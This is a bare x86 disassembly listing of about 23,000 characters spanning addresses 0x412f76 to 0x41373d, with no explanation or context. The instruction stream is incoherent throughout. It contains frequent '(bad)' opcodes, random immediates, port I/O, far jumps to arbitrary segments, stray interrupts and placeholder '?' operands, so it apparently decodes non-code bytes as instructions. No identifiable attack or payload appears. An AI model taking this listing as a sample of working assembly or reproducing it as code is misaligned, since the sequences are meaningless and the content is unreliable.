  412f76:	xchg   DWORD PTR [ebp+0x38eef002],ebx
  412f7c:	imul   edx,DWORD PTR [edi-0x28],0x2d
  412f80:	out    dx,eax
  412f81:	(bad)  [edx]
  412f83:	popa   
  412f84:	cmp    bh,BYTE PTR [eax]
  412f86:	fnstsw WORD PTR [edi-0x74768148]
  412f8c:	aaa    
  412f8d:	(bad)  
  412f8e:	out    0xd1,eax
  412f90:	call   0xbb91d375
  412f95:	popf   
  412f96:	test   ch,dh
  412f98:	shr    BYTE PTR [esi+0x70],0xf3
  412f9c:	ficom  DWORD PTR [ebp+0x6481ae86]
  412fa2:	adc    bl,BYTE PTR [ebx]
  412fa4:	push   edi
  412fa5:	adc    bl,BYTE PTR [edi+eax*2-0x35]
  412fa9:	and    eax,0x61140f6
  412fae:	sub    edx,0x1e2b843d
  412fb4:	xor    al,0xc0
  412fb6:	mov    ?,esp
  412fb8:	sahf   
  412fb9:	or     DWORD PTR [ebx+edi*2],0x34
  412fbd:	fistp  WORD PTR [eax+0x12]
  412fc0:	adc    eax,esp
  412fc2:	loopne 0x412ffe
  412fc4:	repz imul BYTE PTR [ecx-0x63]
  412fc8:	fldcw  WORD PTR [ebp-0x6fc89513]
  412fce:	addr16 cli 
  412fd0:	jmp    0x413028
  412fd2:	mov    BYTE PTR [edi+0x3a323b73],bl
  412fd8:	pop    ebp
  412fd9:	dec    ecx
  412fdb:	sbb    al,0x45
  412fdd:	mov    ah,0xc4
  412fdf:	pop    esp
  412fe0:	int    0xd3
  412fe2:	in     al,dx
  412fe3:	xor    ebp,esi
  412fe5:	xor    al,0x88
  412fe7:	or     edx,DWORD PTR [ebp+0x640bd74d]
  412fed:	mov    esp,0x3b6aa66
  412ff2:	daa    
  412ff3:	lods   al,BYTE PTR ds:[esi]
  412ff4:	fnstsw WORD PTR [esi+0x6c]
  412ff7:	clc    
  412ff8:	aad    0x48
  412ffa:	push   esp
  412ffb:	jecxz  0x412f95
  412ffd:	jmp    0x413044
  412fff:	cdq    
  413000:	stc    
  413001:	in     al,0x3a
  413003:	retf   
  413004:	jo     0x413033
  413006:	or     ah,dl
  413008:	fnstcw WORD PTR [ebp+0x78]
  41300b:	inc    esp
  41300c:	out    dx,eax
  41300d:	inc    ebp
  41300e:	mov    eax,0x31373388
  413013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413014:	xchg   esi,eax
  413015:	cmc    
  413016:	pop    esi
  413017:	test   DWORD PTR [ebp-0x60],edx
  41301a:	bound  ebx,QWORD PTR [eax+0x42ce6c15]
  413020:	test   bh,0x14
  413023:	out    dx,al
  413024:	ins    BYTE PTR es:[edi],dx
  413025:	pop    esp
  413026:	in     al,0x50
  413028:	and    edx,eax
  41302a:	repnz push es
  41302c:	sub    DWORD PTR [ebx],ebx
  41302e:	loop   0x413030
  413030:	push   ds
  413031:	mov    bl,0x5e
  413033:	aaa    
  413034:	sub    bl,BYTE PTR [eax]
  413036:	cmp    eax,0x16cddd5a
  41303b:	dec    ebp
  41303c:	repz or DWORD PTR [ebx+eiz*4],esp
  413040:	mov    ecx,0xbe837aa1
  413045:	inc    esi
  413046:	xlat   BYTE PTR ds:[ebx]
  413047:	adc    al,0x65
  413049:	jg     0x412fee
  41304b:	cs ins DWORD PTR es:[edi],dx
  41304d:	sbb    cl,dl
  41304f:	pop    edx
  413050:	inc    edi
  413051:	fisub  DWORD PTR [edx+esi*4+0x72]
  413055:	dec    esp
  413056:	lods   eax,DWORD PTR ds:[esi]
  413057:	push   ebp
  413058:	or     eax,0x662c4bba
  41305d:	in     al,dx
  41305e:	pop    edx
  41305f:	dec    eax
  413060:	test   al,0xcf
  413062:	rol    BYTE PTR [esi],0xb4
  413065:	nop
  413066:	fmulp  st(4),st
  413068:	xchg   ax,ax
  41306a:	cli    
  41306b:	inc    edi
  41306c:	leave  
  41306d:	jb     0x413034
  41306f:	(bad)  
  413070:	xor    eax,0x39111799
  413075:	xchg   ebp,eax
  413076:	inc    edi
  413077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413078:	pusha  
  413079:	test   BYTE PTR [edx],ah
  41307b:	lahf   
  41307c:	cli    
  41307d:	pop    esi
  41307e:	(bad)  
  41307f:	je     0x413059
  413081:	add    DWORD PTR [esi+ebp*2-0xd4290da],esp
  413088:	or     BYTE PTR [edi-0x1a],0x69
  41308c:	cmp    al,0x83
  41308e:	mov    BYTE PTR [edi+0x5e],ah
  413091:	sbb    eax,DWORD PTR [ecx-0x3cccf811]
  413097:	mov    dl,BYTE PTR [eax+0x2c]
  41309a:	ds mov edi,0x3455cdbf
  4130a0:	xor    eax,0xb45b8439
  4130a5:	dec    esp
  4130a6:	sub    BYTE PTR [esi+edx*2],0x36
  4130aa:	loope  0x413086
  4130ac:	pslld  mm4,QWORD PTR [eax+0x24b67d8b]
  4130b3:	mov    edi,0x2e474f61
  4130b8:	mov    BYTE PTR [ecx+0x39c51b39],dh
  4130be:	xor    al,0x6
  4130c0:	cmp    al,0xc0
  4130c2:	mov    ds:0x3df5ee6a,al
  4130c7:	dec    ebp
  4130c8:	loop   0x413088
  4130ca:	push   ecx
  4130cb:	fisttp WORD PTR [edi+eiz*8]
  4130ce:	nop
  4130cf:	sub    bh,BYTE PTR [ecx-0x43]
  4130d2:	out    dx,al
  4130d3:	adc    BYTE PTR gs:[ecx-0x6a],cl
  4130d7:	sub    DWORD PTR [edx+0x72995b76],edx
  4130dd:	cmc    
  4130de:	test   eax,0x313c01af
  4130e3:	mov    ecx,0xdf3beb2d
  4130e8:	(bad)  
  4130e9:	cmp    BYTE PTR [eax+0x1cac21fb],bh
  4130ef:	test   eax,0x9d87c24d
  4130f4:	mov    dh,0xda
  4130f6:	and    cl,BYTE PTR ds:0xabbfc30c
  4130fc:	pop    ss
  4130fd:	sub    DWORD PTR [edi+0x48],0xa4ae3890
  413104:	arpl   WORD PTR [ecx-0x4f056045],di
  41310a:	mov    cl,0xa5
  41310c:	ins    BYTE PTR es:[edi],dx
  41310d:	adc    eax,0x6a6642ac
  413112:	cmp    cl,BYTE PTR [ebx]
  413114:	xchg   esp,eax
  413115:	jns    0x413158
  413117:	pop    edi
  413118:	cs mov al,fs:0xb682e5dd
  41311f:	test   esi,esi
  413121:	push   esi
  413122:	push   ds
  413123:	adc    DWORD PTR [ecx],esp
  413125:	bswap  edi
  413127:	in     al,dx
  413128:	mov    bl,0xfc
  41312a:	sub    DWORD PTR [edi],ebp
  41312c:	dec    edx
  41312d:	xchg   ecx,eax
  41312e:	add    eax,0x7ba0dacc
  413133:	xchg   DWORD PTR [ecx+0xd9f31ac],ebp
  413139:	inc    ebp
  41313a:	cmp    BYTE PTR [eax-0xd],bl
  41313d:	mov    BYTE PTR [esi+ecx*1+0x21ad37d4],dh
  413144:	fwait
  413145:	(bad)  
  413146:	fs fs adc dh,ah
  41314a:	xchg   ebx,eax
  41314b:	push   ebx
  41314c:	scas   eax,DWORD PTR es:[edi]
  41314d:	fbld   TBYTE PTR [esi]
  41314f:	outs   dx,BYTE PTR ds:[esi]
  413150:	mov    eax,ds:0x5b1525aa
  413155:	mov    cl,0x26
  413157:	sbb    al,0xa
  413159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41315a:	pop    ss
  41315b:	push   ds
  41315c:	ss cld 
  41315e:	xchg   ebx,eax
  41315f:	sub    DWORD PTR [esp+eax*4+0x445fc04b],0xd166687e
  41316a:	hlt    
  41316b:	mov    dl,0x93
  41316d:	xor    esi,DWORD PTR [esi+0x786c7ec7]
  413173:	and    al,0xac
  413175:	jno    0x413121
  413177:	sub    al,0x99
  413179:	jne    0x41310d
  41317b:	push   0xae7de5c9
  413180:	fst    DWORD PTR [ecx]
  413182:	pop    ecx
  413183:	jl     0x413119
  413185:	popa   
  413186:	and    DWORD PTR [eax],0x8355bb1b
  41318c:	mov    bh,ah
  41318e:	ret    
  41318f:	repnz hlt 
  413191:	adc    al,BYTE PTR [eax-0x4d]
  413194:	repnz scas eax,DWORD PTR es:[edi]
  413196:	fwait
  413197:	adc    edx,0x4efe7bfe
  41319d:	sub    al,0x15
  41319f:	jbe    0x413199
  4131a1:	addr16 push ds
  4131a3:	mov    al,BYTE PTR [ebp-0x3fa3cc5e]
  4131a9:	lock shr BYTE PTR [edi],cl
  4131ac:	or     DWORD PTR [ebx+ecx*8],0x82fe968d
  4131b3:	inc    edx
  4131b4:	xchg   ebp,eax
  4131b5:	fstp   DWORD PTR [ecx]
  4131b7:	call   0x7f7d1352
  4131bc:	test   BYTE PTR [ebx+0x16bf7aba],0x1b
  4131c3:	jle    0x41314d
  4131c5:	mov    ds:0x93c70c12,eax
  4131ca:	mov    esi,0x4c5b9fc5
  4131cf:	daa    
  4131d0:	or     al,0xd4
  4131d2:	push   0xb8ed5e58
  4131d7:	add    al,0xde
  4131d9:	xor    edx,DWORD PTR [esi+0x26]
  4131dc:	stos   DWORD PTR es:[edi],eax
  4131dd:	jne    0x413183
  4131df:	stos   DWORD PTR es:[edi],eax
  4131e0:	xchg   esp,eax
  4131e1:	in     eax,0xea
  4131e3:	lahf   
  4131e4:	and    DWORD PTR [ebx+0x6c],ebx
  4131e7:	mov    esi,0x667fcdef
  4131ec:	xchg   edx,eax
  4131ed:	lods   eax,DWORD PTR ds:[esi]
  4131ee:	pop    ds
  4131ef:	fdiv   DWORD PTR [edi+0x63389279]
  4131f5:	cmp    eax,0x5876aec1
  4131fa:	arpl   WORD PTR ds:0x7f071486,bx
  413200:	cdq    
  413201:	out    0x55,eax
  413203:	or     BYTE PTR [eax+ebp*8-0x39],ch
  413207:	inc    ebx
  413208:	popf   
  413209:	mov    ds:0x656b719b,eax
  41320e:	cwde   
  41320f:	stos   BYTE PTR es:[edi],al
  413210:	dec    ebp
  413211:	cmp    al,0x41
  413213:	std    
  413214:	loope  0x41322b
  413216:	xchg   DWORD PTR [ecx+0x20],esi
  413219:	call   0x2a04b8b2
  41321e:	in     eax,0xac
  413220:	(bad)  
  413222:	jl     0x4131ee
  413224:	xlat   BYTE PTR ds:[ebx]
  413225:	arpl   cx,di
  413227:	out    dx,al
  413228:	jmp    0x5acf:0x7796bcb9
  41322f:	push   0xd67b9d13
  413234:	fisttp QWORD PTR [edx]
  413236:	jmp    0x43f4:0x715a6397
  41323d:	push   ebp
  41323e:	inc    esp
  41323f:	pop    edi
  413240:	sahf   
  413241:	inc    DWORD PTR [ebx-0x1]
  413244:	or     BYTE PTR [edx-0x7384e634],bh
  41324a:	inc    edx
  41324b:	out    0x13,al
  41324d:	das    
  41324e:	mov    dh,0x58
  413250:	jbe    0x4132a4
  413252:	jo     0x4131fe
  413254:	mov    ds:0xd4d8123c,eax
  413259:	lods   al,BYTE PTR ds:[esi]
  41325a:	test   al,0xa6
  41325c:	das    
  41325d:	mov    ebp,0x65f5c75
  413262:	stc    
  413263:	add    BYTE PTR [ecx],al
  413265:	mov    eax,0xd869db7
  41326a:	adc    esi,eax
  41326c:	cmp    ebp,DWORD PTR [ecx+0x3d7a932]
  413272:	cmp    eax,0x330697d4
  413277:	(bad)  [esi]
  413279:	fisubr WORD PTR [edx-0x7bf9ce2]
  41327f:	xor    esp,DWORD PTR [esi+0x7f]
  413282:	imul   edi,DWORD PTR [eax-0x1e],0xffffffa6
  413286:	clc    
  413287:	and    eax,0x8f4c5aaa
  41328c:	sbb    al,0xb8
  41328e:	and    esi,DWORD PTR [esi+0x2c333019]
  413294:	pop    esi
  413295:	out    dx,al
  413296:	xchg   ecx,eax
  413297:	shl    BYTE PTR [ecx-0xd16aecb],0xf0
  41329e:	mov    ebx,0xf6426725
  4132a3:	js     0x41322a
  4132a5:	bound  ebx,QWORD PTR [ebx+0x5898ac0a]
  4132ab:	cli    
  4132ac:	fild   QWORD PTR [edi+0x4805147c]
  4132b2:	pop    esi
  4132b3:	jb     0x41325f
  4132b5:	mov    ecx,0x9b76eca7
  4132ba:	and    dl,bh
  4132bc:	mov    cl,0x98
  4132be:	mov    edi,0x3ac9b704
  4132c3:	shl    DWORD PTR [esi+0x3f],0x2d
  4132c7:	cwde   
  4132c8:	(bad)  
  4132c9:	mov    ecx,0xe7af727f
  4132ce:	mov    fs,WORD PTR [esi]
  4132d0:	push   ebx
  4132d1:	mov    ds:0x8a8fe2e1,eax
  4132d6:	inc    ecx
  4132d7:	jns    0x413291
  4132d9:	into   
  4132da:	xchg   edi,eax
  4132db:	addr16 mov ebp,0x4ea32802
  4132e1:	mov    DWORD PTR [esi-0x61],edx
  4132e4:	aad    0x8a
  4132e6:	cld    
  4132e7:	jge    0x413331
  4132e9:	sbb    dh,BYTE PTR [ebp+0x4472bb8b]
  4132ef:	pushf  
  4132f0:	mov    eax,0x15c2b72c
  4132f5:	xchg   esp,eax
  4132f6:	rcr    BYTE PTR [ecx+0x525ab376],cl
  4132fc:	je     0x41333a
  4132fe:	loopne 0x41330c
  413300:	cmovae edx,DWORD PTR [edi]
  413303:	add    al,0xd3
  413305:	sub    eax,0xfd888539
  41330a:	xor    BYTE PTR [ebx+0x4e],al
  41330d:	psubq  mm2,QWORD PTR [edx-0x55c774f6]
  413314:	adc    ecx,edi
  413316:	add    dl,BYTE PTR [edi]
  413318:	popa   
  413319:	add    DWORD PTR [ebx+0x1dcdc98d],ebp
  41331f:	lahf   
  413320:	jmp    0xecbe:0x44ab72e4
  413327:	xchg   ecx,eax
  413328:	(bad)  
  41332a:	clc    
  41332b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41332c:	jg     0x41338b
  41332e:	in     eax,0x41
  413330:	fwait
  413331:	lds    esp,FWORD PTR [ebx]
  413333:	jmp    0x413350
  413335:	push   ecx
  413336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413337:	or     BYTE PTR [edx],bl
  413339:	inc    ebp
  41333a:	xor    DWORD PTR [eax],ecx
  41333c:	jne    0x4133b3
  41333e:	(bad)  
  413340:	retf   
  413341:	mov    cl,0x96
  413343:	outs   dx,BYTE PTR ds:[esi]
  413344:	sub    BYTE PTR [ebx+0x1e],bh
  413347:	out    dx,al
  413348:	xchg   ebp,eax
  413349:	pop    edi
  41334a:	cmp    BYTE PTR es:[ecx],cl
  41334d:	xor    cl,0xcb
  413350:	fs jae 0x4133c9
  413353:	and    BYTE PTR [ebx+edi*1],dl
  413356:	inc    ecx
  413357:	pop    esi
  413358:	rol    DWORD PTR [ebp-0x34],0xe5
  41335c:	pop    es
  41335d:	les    esp,FWORD PTR [eax-0xf]
  413360:	lods   eax,DWORD PTR ds:[esi]
  413361:	fild   DWORD PTR [ecx-0x61d27ecc]
  413367:	mov    es,WORD PTR [ebx+0x31]
  41336a:	loopne 0x4133ce
  41336c:	sbb    eax,0x4bf2edf0
  413371:	mov    dl,0xa0
  413373:	dec    eax
  413374:	dec    ebp
  413375:	test   eax,0xf90c40fe
  41337a:	lods   al,BYTE PTR ds:[esi]
  41337b:	jnp    0x4133ae
  41337d:	jno    0x4133cd
  41337f:	push   es
  413380:	into   
  413381:	or     eax,0x2455c975
  413386:	stc    
  413387:	pop    ss
  413388:	inc    eax
  413389:	mov    ebx,ecx
  41338b:	xchg   DWORD PTR [ebx],ecx
  41338d:	or     eax,0xdceaf5ec
  413392:	adc    DWORD PTR [ecx-0x38],ebp
  413395:	adc    esi,DWORD PTR [eax-0x15cc7877]
  41339b:	push   ebx
  41339c:	pop    edx
  41339d:	fwait
  41339e:	mov    eax,ds:0x5038f052
  4133a3:	mov    ebp,0x5807390c
  4133a8:	cdq    
  4133a9:	mov    BYTE PTR [ebp-0x4a],cl
  4133ac:	dec    esi
  4133ad:	xchg   esi,eax
  4133ae:	xchg   edi,eax
  4133af:	push   ecx
  4133b0:	cmp    edx,DWORD PTR [edx+0x1d]
  4133b3:	inc    ecx
  4133b4:	(bad)  
  4133b5:	dec    esp
  4133b6:	push   ds
  4133b7:	dec    ecx
  4133b8:	xor    esp,DWORD PTR [ecx]
  4133ba:	cdq    
  4133bb:	cwde   
  4133bc:	fbld   TBYTE PTR [edx+esi*1]
  4133bf:	mov    BYTE PTR [eax-0x7b0c3538],0xf5
  4133c6:	push   eax
  4133c7:	mov    ds:0x8ed86729,eax
  4133cc:	inc    ebp
  4133cd:	push   esi
  4133ce:	dec    eax
  4133cf:	sbb    edi,0x2834f334
  4133d5:	loop   0x413442
  4133d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d8:	jecxz  0x4133d7
  4133da:	sub    cl,BYTE PTR [ecx]
  4133dc:	push   ebp
  4133dd:	clc    
  4133de:	loope  0x413435
  4133e0:	sbb    al,0xdf
  4133e2:	ins    BYTE PTR es:[edi],dx
  4133e3:	lahf   
  4133e4:	sti    
  4133e5:	push   cs
  4133e6:	add    DWORD PTR [ebp+0x6d],edi
  4133e9:	leave  
  4133ea:	pop    edx
  4133eb:	loop   0x41339e
  4133ed:	test   DWORD PTR [edi],esi
  4133ef:	inc    esi
  4133f0:	(bad)  
  4133f1:	fisubr DWORD PTR [ebp-0x35]
  4133f4:	outs   dx,BYTE PTR ds:[esi]
  4133f5:	push   esi
  4133f6:	mov    ah,0x7
  4133f8:	xor    bl,BYTE PTR [ebx-0x53]
  4133fb:	sbb    ah,BYTE PTR [eax+0x9]
  4133fe:	mov    eax,ds:0xe3b4a20e
  413403:	push   ds
  413404:	inc    ebp
  413405:	jge    0x4133f8
  413407:	lds    ebp,FWORD PTR es:[edx+0x69bb0820]
  41340e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41340f:	mov    cl,0xd5
  413411:	aad    0xbb
  413413:	pop    ds
  413414:	mov    BYTE PTR [edx+0x1],cl
  413417:	rol    DWORD PTR [esi*1-0x5470f69e],cl
  41341e:	pop    ebx
  41341f:	inc    esp
  413420:	addr16 inc ebp
  413422:	sub    al,0x1
  413424:	mov    ebp,0xc82fc17c
  413429:	jbe    0x413455
  41342b:	cmp    BYTE PTR [ebx-0x64ecaa10],0x5d
  413432:	stc    
  413433:	fisttp WORD PTR [ecx+0x7e]
  413436:	scas   eax,DWORD PTR es:[edi]
  413437:	jo     0x4133fb
  413439:	sbb    al,0x71
  41343b:	aad    0x2a
  41343d:	and    ebx,DWORD PTR [edx-0x11]
  413440:	pop    edx
  413441:	in     eax,dx
  413442:	pop    eax
  413443:	push   es
  413444:	(bad)
  413448:	mov    eax,0xb0057bc9
  41344d:	xchg   ebp,eax
  41344e:	(bad)  
  41344f:	ins    BYTE PTR es:[edi],dx
  413450:	cmp    al,BYTE PTR [eax+0x4b21b00c]
  413456:	xchg   ecx,eax
  413457:	cmp    DWORD PTR [edi],esi
  413459:	and    ecx,ebx
  41345b:	dec    ebp
  41345c:	jne    0x413484
  41345e:	lods   al,BYTE PTR ds:[esi]
  41345f:	in     al,dx
  413460:	xchg   edx,eax
  413461:	(bad)  
  413463:	mov    DWORD PTR [ecx],0x1c52f0fa
  413469:	pop    ss
  41346a:	je     0x4134e4
  41346c:	xor    eax,0xba740878
  413471:	sbb    dl,cl
  413473:	lahf   
  413474:	adc    eax,0xeb617be5
  413479:	mov    ds:0x2aebe810,al
  41347e:	fsubr  st,st(6)
  413480:	(bad)  
  413482:	sub    al,0x8a
  413484:	mov    cl,al
  413486:	mov    BYTE PTR [esi+0x2d],cl
  413489:	loop   0x41343c
  41348b:	(bad)  
  41348c:	data16 sub BYTE PTR [ecx+0x8],cl
  413490:	and    DWORD PTR [esi-0x79e1dc95],0xfffffff2
  413497:	and    bl,BYTE PTR [edi]
  413499:	sbb    DWORD PTR [ebx],ecx
  41349b:	imul   edx,DWORD PTR [esi-0x3f6b8392],0x52
  4134a2:	dec    ebx
  4134a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a4:	mov    dl,0xfd
  4134a6:	dec    ebx
  4134a7:	sbb    eax,0x2de09dfa
  4134ac:	mov    ch,0xbd
  4134ae:	in     al,dx
  4134af:	sti    
  4134b0:	fs inc edi
  4134b2:	retf   0x255c
  4134b5:	or     BYTE PTR [eax-0x46811ef3],dh
  4134bb:	mov    eax,ds:0xa701ac2a
  4134c0:	js     0x413466
  4134c2:	sbb    al,BYTE PTR [esi+0x1f]
  4134c5:	popa   
  4134c6:	xor    al,0xbc
  4134c8:	bound  eax,QWORD PTR [ebx+0x44]
  4134cb:	in     al,0x54
  4134cd:	aaa    
  4134ce:	jb     0x4134ad
  4134d0:	das    
  4134d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134d2:	sub    ebx,eax
  4134d4:	xor    DWORD PTR ds:0x8f43b37c,edi
  4134da:	dec    ebp
  4134db:	das    
  4134dc:	test   al,0x67
  4134de:	mov    bl,BYTE PTR [edi+edi*2+0x650fbf0d]
  4134e5:	fidivr WORD PTR [ebp-0x15700c1]
  4134eb:	mov    edi,0x7a31fa6e
  4134f0:	rol    ebx,1
  4134f2:	xchg   ebx,eax
  4134f3:	jmp    0x41355e
  4134f5:	adc    BYTE PTR [ebp+ecx*4-0x2bbb607f],bh
  4134fc:	cmc    
  4134fd:	idiv   DWORD PTR fs:[eax+0x7adde398]
  413504:	popf   
  413505:	gs xchg edx,eax
  413507:	xchg   edx,eax
  413508:	stc    
  413509:	pop    ecx
  41350a:	sbb    bh,0x88
  41350d:	test   BYTE PTR [eax],0x1e
  413510:	repnz adc BYTE PTR [ecx-0x42],al
  413514:	inc    ebp
  413515:	mov    eax,DWORD PTR [edi]
  413517:	xchg   ecx,eax
  413518:	je     0x4134c7
  41351a:	push   edx
  41351b:	and    ch,cl
  41351d:	inc    ebx
  41351e:	clc    
  41351f:	jo     0x413569
  413521:	pop    esp
  413522:	dec    ebp
  413523:	dec    eax
  413524:	inc    eax
  413525:	mov    BYTE PTR [edi],bh
  413527:	test   al,0x90
  413529:	retf   
  41352a:	and    eax,DWORD PTR [esi+0x3f]
  41352d:	mul    DWORD PTR [ebp+0x2e02f41a]
  413533:	mov    esp,0x919399d6
  413538:	mov    ebp,0x81671440
  41353d:	jbe    0x4134cf
  41353f:	sbb    dh,BYTE PTR [ebp+0x157f0cba]
  413545:	into   
  413546:	adc    ebx,edi
  413548:	add    al,0x25
  41354a:	push   esp
  41354b:	fisttp QWORD PTR [esi-0x3e]
  41354e:	cs (bad) 
  413550:	cmc    
  413551:	ins    DWORD PTR es:[edi],dx
  413552:	pop    ecx
  413553:	(bad)  
  413554:	cdq    
  413555:	pop    esp
  413556:	sbb    eax,0xa1e05035
  41355b:	add    al,0x8f
  41355d:	test   al,0x78
  41355f:	mov    bh,0xa0
  413561:	and    eax,edi
  413563:	cs ret 0x2f65
  413567:	sti    
  413568:	std    
  413569:	push   es
  41356a:	push   esi
  41356b:	(bad)  
  41356c:	jno    0x413534
  41356e:	pop    edx
  41356f:	pop    edx
  413570:	xchg   DWORD PTR [edi+eax*2],eax
  413573:	fsubr  st,st(7)
  413575:	mul    bl
  413577:	inc    eax
  413578:	loope  0x4135ec
  41357a:	jns    0x413504
  41357c:	stos   DWORD PTR es:[edi],eax
  41357d:	jl     0x4135d9
  41357f:	mov    ebp,0x2b25f308
  413584:	push   es
  413585:	inc    esp
  413586:	lds    esp,FWORD PTR [edx+0x27]
  413589:	inc    edx
  41358a:	call   0x20d9cb6a
  41358f:	int3   
  413590:	jmp    0x3fe0:0x9f57f293
  413597:	out    dx,eax
  413598:	sub    edx,edx
  41359a:	pop    ecx
  41359b:	aas    
  41359c:	jle    0x413539
  41359e:	inc    edx
  41359f:	xor    eax,0x7408ae5
  4135a4:	push   edx
  4135a5:	mov    esi,0x90dfadfc
  4135aa:	mov    ch,al
  4135ac:	stmxcsr DWORD PTR [ebx+0x646186d9]
  4135b3:	inc    edx
  4135b4:	or     ch,ch
  4135b6:	xchg   esi,eax
  4135b7:	sub    BYTE PTR [edx],bl
  4135b9:	add    eax,0xc02654c6
  4135be:	repnz adc BYTE PTR [esi+esi*8+0x24bd26e0],ch
  4135c6:	(bad)  
  4135c7:	cld    
  4135c8:	out    dx,eax
  4135c9:	and    al,al
  4135cb:	out    dx,al
  4135cc:	sbb    BYTE PTR [edx],dl
  4135ce:	dec    eax
  4135cf:	xor    BYTE PTR [ecx-0x27],dh
  4135d2:	call   FWORD PTR [edi+0x44]
  4135d5:	jle    0x41362b
  4135d7:	cmp    al,0xac
  4135d9:	and    DWORD PTR [ebp-0x32],ecx
  4135dc:	in     al,0x5f
  4135de:	ret    0xd2ba
  4135e1:	dec    ebx
  4135e2:	cs adc al,0x87
  4135e5:	inc    eax
  4135e6:	add    al,cl
  4135e8:	dec    esp
  4135e9:	sub    al,0x4
  4135eb:	pop    ebx
  4135ec:	xchg   edi,eax
  4135ed:	ss pop ecx
  4135ef:	outs   dx,BYTE PTR ds:[esi]
  4135f0:	xor    al,0x4a
  4135f2:	sti    
  4135f3:	and    eax,0x1a5e4cdd
  4135f8:	(bad)  
  4135f9:	clc    
  4135fa:	lods   al,BYTE PTR ds:[esi]
  4135fb:	mov    bh,0x10
  4135fd:	jnp    0x413645
  4135ff:	cmp    BYTE PTR [edx-0x5ae47d93],bl
  413605:	mov    dh,0x2
  413607:	mov    DWORD PTR [ebx],0x2f7a25d9
  41360d:	pop    edi
  41360e:	fprem  
  413610:	inc    eax
  413611:	lods   al,BYTE PTR ds:[esi]
  413612:	xchg   edx,eax
  413613:	push   eax
  413614:	pusha  
  413615:	mov    edx,0xf880a580
  41361a:	scas   eax,DWORD PTR es:[edi]
  41361b:	adc    DWORD PTR [ecx+0x11],0xffffffb2
  41361f:	fcomp  QWORD PTR [ebx+0x4e]
  413622:	jns    0x4135ca
  413624:	lods   eax,DWORD PTR ds:[esi]
  413625:	call   0xe096:0x26fd6e39
  41362c:	cmc    
  41362d:	and    cl,BYTE PTR [ebx+0x2a2d0d52]
  413633:	push   0x12
  413635:	(bad)  
  413636:	adc    eax,0x930c77cb
  41363b:	lock div ebp
  41363e:	mov    BYTE PTR [eax],0xaf
  413641:	fdivp  st(1),st
  413643:	add    esp,DWORD PTR [edx+eax*8]
  413646:	mov    cl,0x11
  413648:	in     al,dx
  413649:	mov    esi,0x137bd49b
  41364e:	daa    
  41364f:	in     eax,dx
  413650:	adc    bh,cl
  413652:	mov    WORD PTR [eax+0x17ea7db2],?
  413658:	stos   BYTE PTR es:[edi],al
  413659:	dec    esi
  41365a:	mov    ss,WORD PTR [ebx-0x12ebadc]
  413660:	clc    
  413661:	pop    ebp
  413662:	sahf   
  413663:	dec    edx
  413664:	jmp    0xe52b6f27
  413669:	fcmovu st,st(1)
  41366b:	mov    dl,0xd1
  41366d:	adc    eax,DWORD PTR [ebx+ebx*4-0x6131f9b7]
  413674:	push   ds
  413675:	gs and al,0xbb
  413678:	adc    eax,0x7feb0163
  41367d:	(bad)  
  41367e:	xlat   BYTE PTR ds:[ebx]
  41367f:	xchg   ebp,eax
  413680:	add    al,0xd7
  413682:	lods   eax,DWORD PTR ds:[esi]
  413683:	sub    eax,0x93f31892
  413688:	inc    ecx
  413689:	fs mov dl,0xb5
  41368c:	jle    0x413665
  41368e:	fmul   DWORD PTR [eax]
  413690:	xchg   edx,eax
  413691:	sub    edx,DWORD PTR [esi+0x459537af]
  413697:	enter  0x7317,0x5f
  41369b:	xlat   BYTE PTR ds:[ebx]
  41369c:	xor    eax,0x7237afd7
  4136a1:	(bad)  
  4136a2:	or     eax,0xaf2b4421
  4136a7:	cmp    ebp,ebp
  4136a9:	dec    edx
  4136aa:	jns    0x413662
  4136ac:	xchg   BYTE PTR [edx],cl
  4136ae:	ins    BYTE PTR es:[edi],dx
  4136af:	leave  
  4136b0:	rcl    BYTE PTR [eax+0x2e27ee1f],cl
  4136b6:	je     0x41372e
  4136b8:	addr16 adc al,0xa8
  4136bb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4136bd:	iret   
  4136be:	and    BYTE PTR [esi+edx*2],ch
  4136c1:	push   edi
  4136c2:	adc    BYTE PTR [ebx+0x739d4493],dl
  4136c8:	sbb    eax,0x698a8e57
  4136cd:	and    al,0xb
  4136cf:	imul   esp,DWORD PTR [eax-0x4f7d40a4],0xffffffed
  4136d6:	(bad)  
  4136d7:	cmp    bh,ch
  4136d9:	loopne 0x413676
  4136db:	stos   DWORD PTR es:[edi],eax
  4136dc:	call   DWORD PTR [edx-0x6e]
  4136df:	lods   al,BYTE PTR ds:[esi]
  4136e0:	push   ds
  4136e1:	xor    ecx,DWORD PTR [esi]
  4136e3:	icebp  
  4136e4:	popa   
  4136e5:	mov    ebp,0xe1e8aab3
  4136ea:	sub    esi,eax
  4136ec:	sbb    ch,al
  4136ee:	lods   eax,DWORD PTR ds:[esi]
  4136ef:	pop    edx
  4136f0:	adc    ah,BYTE PTR [eax-0x4116c0b1]
  4136f6:	scas   eax,DWORD PTR es:[edi]
  4136f7:	out    dx,al
  4136f8:	xor    dl,al
  4136fa:	cmp    DWORD PTR [ecx-0x65679797],ebp
  413700:	mov    ah,0xce
  413702:	jmp    0x1374:0xaa97bd49
  413709:	pop    ds
  41370a:	xchg   DWORD PTR [ecx],ecx
  41370c:	rcr    BYTE PTR [edi],1
  41370e:	stos   BYTE PTR es:[edi],al
  41370f:	cmp    WORD PTR [ebx+0x7a7916cb],di
  413716:	fwait
  413717:	bound  ecx,QWORD PTR [ecx+ebx*1-0x4]
  41371b:	mov    ecx,0xb31b1115
  413720:	push   ebp
  413721:	or     eax,0x3d77a606
  413726:	int    0xd1
  413728:	dec    edx
  413729:	ds push edi
  41372b:	adc    cl,BYTE PTR [edi+ebp*8+0x3d4ef280]
  413732:	xchg   ebx,eax
  413733:	adc    BYTE PTR [ebp-0x18236716],cl
  413739:	in     eax,0xa3
  41373b:	and    BYTE PTR [edx],ah
  41373d:	add    BYTE PTR [ebx+esi*1],ch
